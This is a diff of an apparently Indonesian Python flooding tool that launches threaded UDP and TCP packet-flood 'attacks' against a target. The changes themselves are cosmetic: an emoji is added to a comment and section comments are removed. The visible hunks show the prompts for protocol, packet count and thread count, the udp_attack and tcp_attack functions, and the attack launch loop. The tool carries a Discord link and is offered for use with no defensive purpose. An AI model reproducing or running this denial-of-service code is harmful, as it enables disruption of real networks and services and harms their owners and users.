@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # (c) VatieraSynth Dev — Semua hak cipta dilindungi
-# Jangan ambil script tanpa izin, atau karma akan bicara
+# Jangan ambil script tanpa izin, atau karma akan bicara😂
 # Discord Official: https://discord.gg/fRDAvXsU
 
 import os
@@ -9,7 +9,6 @@ import threading
 import random
 import time
 
-# === Color Themes ===
 RED = '\033[91m'
 GREEN = '\033[92m'
 CYAN = '\033[96m'
@@ -37,7 +36,6 @@ choice = str(input(f"{CYAN}» Gunakan UDP? (y/n): {RESET}")).lower()
 times = int(input(f"{CYAN}» Jumlah Packet per Thread: {RESET}"))
 threads = int(input(f"{CYAN}» Jumlah Threads: {RESET}"))
 
-# === Attack Functions ===
 def udp_attack():
     data = random._urandom(1024)
     i = random.choice([f"{GREEN}[•]", f"{CYAN}[#]", f"{YELLOW}[!]"])
@@ -65,7 +63,6 @@ def tcp_attack():
         except Exception:
             print(f"{RED}[x] TCP Failed to connect!{RESET}")
 
-# === Thread Execution ===
 print(f"\n{BOLD}{BLUE}Launching Attack with {threads} Threads...{RESET}")
 time.sleep(2)
 for y in range(threads):
